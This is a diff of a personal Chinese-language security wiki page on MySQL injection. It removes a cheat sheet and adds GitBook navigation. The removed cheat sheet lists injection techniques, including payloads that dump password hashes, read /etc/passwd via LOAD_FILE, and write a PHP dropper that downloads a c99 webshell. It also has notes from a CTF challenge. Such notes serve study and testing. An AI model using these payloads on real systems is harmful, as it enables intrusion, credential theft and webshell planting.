@@ -1,186 +1,2055 @@
+
 <!DOCTYPE HTML>
-<html>
+<html lang="cn" >
     <head>
-        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
-        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
-        <title>Mysql 注入 - Wiki | janes</title>
-        <meta name="keywords" content=""/>
-        <meta name="description" content=""/>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    </head>
-
-    <body>
-        <div id="container">
-            
-<div id="header">
-  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;Mysql 注入</div>
-</div>
-<div class="clearfix"></div>
-<div id="title">Mysql 注入</div>
-  <div id="content">
-  <div class="hlcode"><pre><span class="n">Select</span> <span class="n">Nth</span> <span class="n">Row</span>  <span class="n">SELECT</span> <span class="n">host</span><span class="p">,</span><span class="n">user</span> <span class="n">FROM</span> <span class="n">user</span> <span class="n">ORDER</span> <span class="n">BY</span> <span class="n">host</span> <span class="n">LIMIT</span> <span class="mi">1</span> <span class="n">OFFSET</span> <span class="mi">0</span><span class="p">;</span> <span class="err">#</span> <span class="n">rows</span> <span class="n">numbered</span> <span class="n">from</span> <span class="mi">0</span>
-
-<span class="n">Select</span> <span class="n">Nth</span> <span class="n">Char</span> <span class="n">SELECT</span> <span class="n">substr</span><span class="p">(</span><span class="err">‘</span><span class="n">abcd</span><span class="err">’</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">c</span>
-<span class="n">Bitwise</span> <span class="n">AND</span> <span class="n">SELECT</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">2</span><span class="p">;</span> <span class="err">#</span> <span class="n">returns</span> <span class="mi">2</span>
-<span class="n">SELECT</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span> <span class="err">#</span> <span class="n">returns</span> <span class="mi">0</span>
-<span class="n">ASCII</span> <span class="n">Value</span> <span class="o">-&gt;</span> <span class="n">Char</span> <span class="n">SELECT</span> <span class="kt">char</span><span class="p">(</span><span class="mi">65</span><span class="p">);</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">A</span>
-<span class="n">Char</span> <span class="o">-&gt;</span> <span class="n">ASCII</span> <span class="n">Value</span> <span class="n">SELECT</span> <span class="n">ascii</span><span class="p">(</span><span class="err">‘</span><span class="n">A</span><span class="err">’</span><span class="p">);</span> <span class="err">#</span> <span class="n">returns</span> <span class="mi">65</span>
-<span class="n">Casting</span> <span class="n">SELECT</span> <span class="n">cast</span><span class="p">(</span><span class="err">’</span><span class="mi">1</span><span class="err">′</span> <span class="n">AS</span> <span class="kt">unsigned</span> <span class="n">integer</span><span class="p">);</span>
-<span class="n">SELECT</span> <span class="nf">cast</span><span class="p">(</span><span class="err">’</span><span class="mi">123</span><span class="err">′</span> <span class="n">AS</span> <span class="kt">char</span><span class="p">);</span>
-
-<span class="n">String</span> <span class="n">Concatenation</span>    <span class="n">SELECT</span> <span class="nf">CONCAT</span><span class="p">(</span><span class="err">‘</span><span class="n">A</span><span class="err">’</span><span class="p">,</span><span class="err">&#39;</span><span class="n">B</span><span class="err">’</span><span class="p">);</span> <span class="err">#</span><span class="n">returns</span> <span class="n">AB</span>
-<span class="n">SELECT</span> <span class="n">CONCAT</span><span class="p">(</span><span class="err">‘</span><span class="n">A</span><span class="err">’</span><span class="p">,</span><span class="err">&#39;</span><span class="n">B</span><span class="err">’</span><span class="p">,</span><span class="err">&#39;</span><span class="n">C</span><span class="err">’</span><span class="p">);</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">ABC</span>
-<span class="n">If</span> <span class="n">Statement</span>    <span class="n">SELECT</span> <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="err">’</span><span class="n">foo</span><span class="err">’</span><span class="p">,</span><span class="err">&#39;</span><span class="n">bar</span><span class="err">’</span><span class="p">);</span> <span class="err">—</span> <span class="n">returns</span> <span class="err">‘</span><span class="n">foo</span><span class="err">’</span>
-<span class="n">Case</span> <span class="n">Statement</span>  <span class="n">SELECT</span> <span class="n">CASE</span> <span class="n">WHEN</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="n">THEN</span> <span class="err">‘</span><span class="n">A</span><span class="err">’</span> <span class="n">ELSE</span> <span class="err">‘</span><span class="n">B</span><span class="err">’</span> <span class="n">END</span><span class="p">;</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">A</span>
-<span class="n">Avoiding</span> <span class="n">Quotes</span> <span class="n">SELECT</span> <span class="mi">0</span><span class="err">×</span><span class="mi">414243</span><span class="p">;</span> <span class="err">#</span> <span class="n">returns</span> <span class="n">ABC</span>
-<span class="n">Time</span> <span class="n">Delay</span>  <span class="n">SELECT</span> <span class="n">BENCHMARK</span><span class="p">(</span><span class="mi">1000000</span><span class="p">,</span><span class="n">MD5</span><span class="p">(</span><span class="err">‘</span><span class="n">A</span><span class="err">’</span><span class="p">));</span>
-<span class="n">SELECT</span> <span class="nf">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span> <span class="err">#</span> <span class="o">&gt;=</span> <span class="mf">5.0.12</span>
-<span class="n">Make</span> <span class="n">DNS</span> <span class="n">Requests</span>   <span class="n">Impossible</span><span class="o">?</span>
-<span class="n">Command</span> <span class="n">Execution</span>   <span class="n">If</span> <span class="n">mysqld</span> <span class="p">(</span><span class="o">&lt;</span><span class="mf">5.0</span><span class="p">)</span> <span class="n">is</span> <span class="n">running</span> <span class="n">as</span> <span class="n">root</span> <span class="n">AND</span> <span class="n">you</span> <span class="n">compromise</span> <span class="n">a</span> <span class="n">DBA</span> <span class="n">account</span> <span class="n">you</span> <span class="n">can</span> <span class="n">execute</span> <span class="n">OS</span> <span class="n">commands</span> <span class="n">by</span> <span class="n">uploading</span> <span class="n">a</span> <span class="n">shared</span> <span class="n">object</span> <span class="n">file</span> <span class="n">into</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span> <span class="p">(</span><span class="n">or</span> <span class="n">similar</span><span class="p">).</span>  <span class="n">The</span> <span class="p">.</span><span class="n">so</span> <span class="n">file</span> <span class="n">should</span> <span class="n">contain</span> <span class="n">a</span> <span class="n">User</span> <span class="n">Defined</span> <span class="n">Function</span> <span class="p">(</span><span class="n">UDF</span><span class="p">).</span>  <span class="n">raptor_udf</span><span class="p">.</span><span class="n">c</span> <span class="n">explains</span> <span class="n">exactly</span> <span class="n">how</span> <span class="n">you</span> <span class="n">go</span> <span class="n">about</span> <span class="n">this</span><span class="p">.</span>  <span class="n">Remember</span> <span class="n">to</span> <span class="n">compile</span> <span class="k">for</span> <span class="n">the</span> <span class="n">target</span> <span class="n">architecture</span> <span class="n">which</span> <span class="n">may</span> <span class="n">or</span> <span class="n">may</span> <span class="n">not</span> <span class="n">be</span> <span class="n">the</span> <span class="n">same</span> <span class="n">as</span> <span class="n">your</span> <span class="n">attack</span> <span class="n">platform</span><span class="p">.</span>
-</pre></div>
-
-
-<h2 id="0x01">0x01 信息收集</h2>
-<div class="hlcode"><pre><span class="n">system_user</span><span class="p">()</span>     <span class="err">系统用户名</span>
-<span class="n">user</span><span class="p">()</span>            <span class="n">MYSQL</span><span class="err">用户名</span> 
-<span class="n">current_user</span><span class="p">()</span>    <span class="err">当前用户名</span>
-<span class="n">session_user</span><span class="p">()</span>    <span class="err">连接数据库的用户名</span>
-<span class="n">database</span><span class="p">()</span>        <span class="err">当前数据库名</span>
-<span class="n">schema</span><span class="p">()</span>          <span class="err">当前数据库名</span>
-<span class="n">version</span><span class="p">()</span>         <span class="err">当前数据库版本信息</span>
-<span class="err">@@</span><span class="n">version</span>
-<span class="n">load_file</span><span class="p">()</span>       <span class="n">MYSQL</span><span class="err">读取本地文件</span>
-
-<span class="err">@@</span><span class="n">datadir</span>         <span class="n">Location</span> <span class="n">of</span> <span class="n">DB</span> <span class="n">files</span>
-<span class="err">@@</span><span class="n">hostname</span>        <span class="err">服务器主机名</span>
-</pre></div>
-
-
-<div class="hlcode"><pre><span class="n">List</span> <span class="n">Users</span>              <span class="n">SELECT</span> <span class="n">user</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span><span class="p">;</span> <span class="err">—</span> <span class="n">priv</span>
-<span class="n">List</span> <span class="n">Password</span> <span class="n">Hashes</span>    <span class="n">SELECT</span> <span class="n">host</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">password</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span><span class="p">;</span> <span class="err">—</span> <span class="n">priv</span>
-
-<span class="n">SELECT</span> <span class="n">distinct</span><span class="p">(</span><span class="n">db</span><span class="p">)</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">db</span> <span class="err">—</span> <span class="n">priv</span>
-</pre></div>
-
-
-<h2 id="0x02-information_schema">0x02 information_schema</h2>
-<blockquote>
-<p>MySQL &gt;= v5.0</p>
-</blockquote>
-<div class="hlcode"><pre><span class="cp"># 查看数据库服务器上的数据库</span>
-<span class="n">SELECT</span> <span class="n">SCHEMA_NAME</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span>
-
-<span class="cp"># 查看某个数据库里面的数据表</span>
-<span class="n">SELECT</span> <span class="n">table_name</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span> <span class="n">WHERE</span> <span class="n">table_schema</span> <span class="o">=</span><span class="err">&#39;数据库名&#39;</span>
-
-<span class="cp"># 查看某个数据表里面的字段</span>
-<span class="cp">#   默认当前数据库</span>
-<span class="n">SELECT</span> <span class="n">COLUMN_NAME</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span> <span class="n">WHERE</span> <span class="n">table_name</span> <span class="o">=</span><span class="err">&#39;表名&#39;</span>
-<span class="cp">#   指定数据库</span>
-<span class="n">SELECT</span> <span class="n">COLUMN_NAME</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span> <span class="n">WHERE</span> <span class="n">table_name</span> <span class="o">=</span><span class="err">&#39;表名&#39;</span> <span class="n">AND</span> <span class="n">table_schema</span> <span class="o">=</span><span class="err">&#39;数据库名&#39;</span>
-
-<span class="n">SELECT</span> <span class="n">table_schema</span><span class="p">,</span> <span class="n">table_name</span><span class="p">,</span> <span class="n">column_name</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">WHERE</span> <span class="n">table_schema</span> <span class="o">!=</span> <span class="err">&#39;</span><span class="n">mysql</span><span class="err">&#39;</span> <span class="n">AND</span> <span class="n">table_schema</span> <span class="o">!=</span> <span class="err">&#39;</span><span class="n">information_schema</span><span class="err">&#39;</span>
-
-<span class="cp"># find table which have a column called ‘username’</span>
-<span class="n">SELECT</span> <span class="n">table_schema</span><span class="p">,</span> <span class="n">table_name</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">WHERE</span> <span class="n">column_name</span> <span class="o">=</span> <span class="err">‘</span><span class="n">username</span><span class="err">’</span>
-
-<span class="cp"># List Privilege</span>
-<span class="n">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">privilege_type</span><span class="p">,</span> <span class="n">is_grantable</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span><span class="p">;</span>
-</pre></div>
-
-
-<h2 id="0x03">0x03 注释</h2>
-<div class="hlcode"><pre> <span class="o">--</span> <span class="n">comment</span>     <span class="err">#</span> <span class="err">&#39;</span><span class="o">--</span><span class="err">&#39;</span> <span class="err">前后有空格</span>
-
-<span class="cp">#comment</span>
-
-<span class="cm">/*comment*/</span>
-</pre></div>
-
-
-<h2 id="0x04">0x04 文件权限</h2>
-<p>查询用户读写文件操作权限：</p>
-<div class="hlcode"><pre><span class="cp"># 需要root用户来执行   MySQL 4/5</span>
-<span class="n">SELECT</span> <span class="n">file_priv</span> <span class="n">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span> <span class="n">WHERE</span> <span class="n">user</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">username</span><span class="err">&#39;</span><span class="p">;</span>
-
-<span class="cp"># 普通用户都可以   MySQL 5</span>
-<span class="n">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">is_grantable</span> <span class="n">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span> <span class="n">WHERE</span> <span class="n">privilege_type</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">file</span><span class="err">&#39;</span> <span class="n">AND</span> <span class="n">grantee</span> <span class="n">like</span> <span class="err">&#39;</span><span class="o">%</span><span class="n">username</span><span class="o">%</span><span class="err">&#39;</span><span class="p">;</span>   
-</pre></div>
-
-
-<h2 id="0x05-load_file">0x05 load_file()</h2>
-<p>用户有文件操作权限则可以读取文件</p>
-<div class="hlcode"><pre><span class="err">…&#39;</span> <span class="n">UNION</span> <span class="n">ALL</span> <span class="n">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="err">&#39;</span><span class="p">)</span>    <span class="err">—</span> <span class="n">priv</span><span class="p">,</span> <span class="n">can</span> <span class="n">only</span> <span class="n">read</span> <span class="n">world</span><span class="o">-</span><span class="n">readable</span> <span class="n">files</span><span class="p">.</span>
-
-
-<span class="n">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="mh">0x2F6574632F706173737764</span><span class="p">);</span>
-</pre></div>
-
-
-<p>要求：</p>
-<div class="hlcode"><pre><span class="err">文件必须在服务器上。</span>
-<span class="n">LOAD_FILE</span><span class="p">()</span><span class="err">函数操作文件的当前目录是@@</span><span class="n">datadir</span> <span class="err">。</span>
-<span class="n">MySQL</span><span class="err">用户必须拥有对此文件读取的权限。</span>
-<span class="err">文件大小必须小于</span> <span class="n">max_allowed_packet</span><span class="err">。</span>
-<span class="err">@@</span><span class="n">max_allowed_packet</span><span class="err">的默认大小是</span><span class="mi">1047552</span> <span class="err">字节</span>
-<span class="err">文件不存在或不可读，返回</span><span class="nb">NULL</span>
-</pre></div>
-
-
-<h2 id="0x06">0x06 写文件</h2>
-<p>如果用户有文件操作权限可以写文件</p>
-<div class="hlcode"><pre><span class="n">INTO</span> <span class="n">OUTFILE</span><span class="o">/</span><span class="n">DUMPFILE</span>
-
-<span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="n">mytable</span> <span class="n">INTO</span> <span class="n">dumpfile</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">somefile</span><span class="err">&#39;</span><span class="p">;</span> <span class="err">—</span> <span class="n">priv</span><span class="p">,</span> <span class="n">write</span> <span class="n">to</span> <span class="n">file</span> <span class="n">system</span>
-</pre></div>
-
-
-<div class="hlcode"><pre><span class="nx">SELECT</span> <span class="err">&#39;</span><span class="cp">&lt;?</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">f</span><span class="p">],</span> <span class="nx">\</span><span class="s1">&#39;w\&#39;), file_get_contents($_GET[u])); ?&gt;&#39;</span> <span class="nx">INTO</span> <span class="nx">OUTFILE</span> <span class="s1">&#39;/var/www/get.php&#39;</span>
-
-<span class="nx">http</span><span class="o">://</span><span class="nx">localhost</span><span class="o">/</span><span class="nx">get</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">f</span><span class="o">=</span><span class="nx">shell</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">u</span><span class="o">=</span><span class="nx">http</span><span class="o">://</span><span class="nx">localhost</span><span class="o">/</span><span class="nx">c99</span><span class="o">.</span><span class="nx">txt</span>
-</pre></div>
-
-
-<p>注：</p>
-<div class="hlcode"><pre><span class="n">INTO</span> <span class="n">OUTFILE</span> <span class="err">不可以覆盖已存在的文件。</span>
-<span class="n">INTO</span> <span class="n">OUTFILE</span> <span class="err">必须是最后一个查询。</span>
-<span class="err">引号是必须的，因为没有办法可以编码路径名</span>
-</pre></div>
-
-
-<h2 id="0x">0x 实战</h2>
-<h3 id="group-by-with-rollup">group by with rollup</h3>
-<blockquote>
-<p>alictf 2015 FuckMySQL</p>
-</blockquote>
-<p><a href="http://dev.mysql.com/doc/refman/5.5/en/group-by-modifiers.html">group by document</a></p>
-<p>key code:</p>
-<div class="hlcode"><pre><span class="x">$result = $db-&gt;query($sql);</span>
-<span class="x">if ($result-&gt;num_rows == 1) {</span>
-<span class="x">    $row = $result-&gt;fetch_assoc();</span>
-<span class="x">    if ($row[&#39;key2&#39;] == $_POST[&#39;key2&#39;]) {</span>
-<span class="x">        echo &quot;=.= Y are u so diao? I will give you a flag!  &quot;.$flag;</span>
-<span class="x">        exit;</span>
-<span class="x">    }</span>
-<span class="x">} else {</span>
-<span class="x">    echo &quot;I am fucking!&quot;;</span>
-<span class="x">}</span>
-</pre></div>
-
-
-<h2 id="_1">参考：</h2>
-<p><a href="http://drops.wooyun.org/tips/123">乌云 mySql 注入科普</a></p>
-<p><a href="http://drops.wooyun.org/tips/7299">乌云 mysql 注入技巧</a></p>
-<p><a href="http://www.openwall.com/john/">crack mysql password</a></p>
-</div>
-
-        </div>
-        <div id="footer">
-            <span>
-                Copyright © 2012-2016 .
-                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
-            </span>
-        </div>
+        <title>Mysql 注入 · Wiki | janes</title>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.0">
+        <meta name="author" content="janes">
         
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="note.html" />
+    
+    
+    <link rel="prev" href="dns.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Wiki
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    Python
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../Python/anaconda.html">
+            
+                <a href="../Python/anaconda.html">
+            
+                    
+                    Anaconda
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../Python/django.html">
+            
+                <a href="../Python/django.html">
+            
+                    
+                    Django 1.8.7
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../Python/excel.html">
+            
+                <a href="../Python/excel.html">
+            
+                    
+                    Excel
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../Python/flask.html">
+            
+                <a href="../Python/flask.html">
+            
+                    
+                    Flask
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../Python/flask_github_api_login.html">
+            
+                <a href="../Python/flask_github_api_login.html">
+            
+                    
+                    Flask github api login
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../Python/函数.html">
+            
+                <a href="../Python/函数.html">
+            
+                    
+                    Function
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../Python/http_server.html">
+            
+                <a href="../Python/http_server.html">
+            
+                    
+                    Http_server
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../Python/iterators.html">
+            
+                <a href="../Python/iterators.html">
+            
+                    
+                    Iterators
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../Python/log.html">
+            
+                <a href="../Python/log.html">
+            
+                    
+                    Log
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../Python/pickle.html">
+            
+                <a href="../Python/pickle.html">
+            
+                    
+                    Pickle
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../Python/pythonic.html">
+            
+                <a href="../Python/pythonic.html">
+            
+                    
+                    Pythonic
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="../Python/random.html">
+            
+                <a href="../Python/random.html">
+            
+                    
+                    Random
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="../Python/scapy.html">
+            
+                <a href="../Python/scapy.html">
+            
+                    
+                    Scapy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="../Python/selenium.html">
+            
+                <a href="../Python/selenium.html">
+            
+                    
+                    Selenium and Xvfb 
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="../Python/socket.html">
+            
+                <a href="../Python/socket.html">
+            
+                    
+                    Socket
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="../Python/network_package.html">
+            
+                <a href="../Python/network_package.html">
+            
+                    
+                    network package
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="../Python/note.html">
+            
+                <a href="../Python/note.html">
+            
+                    
+                    note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="../Python/eval.html">
+            
+                <a href="../Python/eval.html">
+            
+                    
+                    动态执行字符串代码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="../Python/command.html">
+            
+                <a href="../Python/command.html">
+            
+                    
+                    命令执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.20" data-path="../Python/buildin_type.html">
+            
+                <a href="../Python/buildin_type.html">
+            
+                    
+                    常用内置对象操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.21" data-path="../Python/常用模块.html">
+            
+                <a href="../Python/常用模块.html">
+            
+                    
+                    常用模块
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.22" data-path="../Python/wechat.html">
+            
+                <a href="../Python/wechat.html">
+            
+                    
+                    微信公众号开发
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.23" data-path="../Python/模拟http-post-upload-file.html">
+            
+                <a href="../Python/模拟http-post-upload-file.html">
+            
+                    
+                    模拟HTTP POST upload file
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.24" data-path="../Python/自省.html">
+            
+                <a href="../Python/自省.html">
+            
+                    
+                    自省
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.25" data-path="../Python/运维.html">
+            
+                <a href="../Python/运维.html">
+            
+                    
+                    运维
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.26" data-path="../Python/processing.html">
+            
+                <a href="../Python/processing.html">
+            
+                    
+                    进(线程)程处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.27" data-path="../Python/迭代器和生成器.html">
+            
+                <a href="../Python/迭代器和生成器.html">
+            
+                    
+                    迭代器和生成器
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../Linux/centos.html">
+            
+                <a href="../Linux/centos.html">
+            
+                    
+                    Centos7
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../Linux/cmdline.html">
+            
+                <a href="../Linux/cmdline.html">
+            
+                    
+                    Cmdline
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../Linux/ncat.html">
+            
+                <a href="../Linux/ncat.html">
+            
+                    
+                    Nc
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../Linux/nmap.html">
+            
+                <a href="../Linux/nmap.html">
+            
+                    
+                    Nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../Linux/ubuntu.html">
+            
+                <a href="../Linux/ubuntu.html">
+            
+                    
+                    Ubuntu
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    WebSecurity
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="attacktool.html">
+            
+                <a href="attacktool.html">
+            
+                    
+                    AttackTool
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="csrf.html">
+            
+                <a href="csrf.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="dns.html">
+            
+                <a href="dns.html">
+            
+                    
+                    DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.4" data-path="mysqlinject.html">
+            
+                <a href="mysqlinject.html">
+            
+                    
+                    Mysql 注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="note.html">
+            
+                <a href="note.html">
+            
+                    
+                    Note
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="php序列化.html">
+            
+                <a href="php序列化.html">
+            
+                    
+                    PHP序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="ssti-jinja2.html">
+            
+                <a href="ssti-jinja2.html">
+            
+                    
+                    SSTI Jinja2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="scan_for_info.html">
+            
+                <a href="scan_for_info.html">
+            
+                    
+                    Scan For Information
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="sqlinject.html">
+            
+                <a href="sqlinject.html">
+            
+                    
+                    SqlInject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="vulnapp.html">
+            
+                <a href="vulnapp.html">
+            
+                    
+                    Vulnapp
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="xss.html">
+            
+                <a href="xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="backdoor.html">
+            
+                <a href="backdoor.html">
+            
+                    
+                    backdoor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.13" data-path="linux提权.html">
+            
+                <a href="linux提权.html">
+            
+                    
+                    linux提权
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="mysql.html">
+            
+                <a href="mysql.html">
+            
+                    
+                    mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="mysql宽字节注入.html">
+            
+                <a href="mysql宽字节注入.html">
+            
+                    
+                    mysql宽字节注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="mysql注入过滤.html">
+            
+                <a href="mysql注入过滤.html">
+            
+                    
+                    mysql注入过滤
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.17" data-path="php.html">
+            
+                <a href="php.html">
+            
+                    
+                    php
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.18" data-path="php-match-or-comapre.html">
+            
+                <a href="php-match-or-comapre.html">
+            
+                    
+                    php match or comapre
+            
+                </a>
+            
+
+            
+        </li>
+    
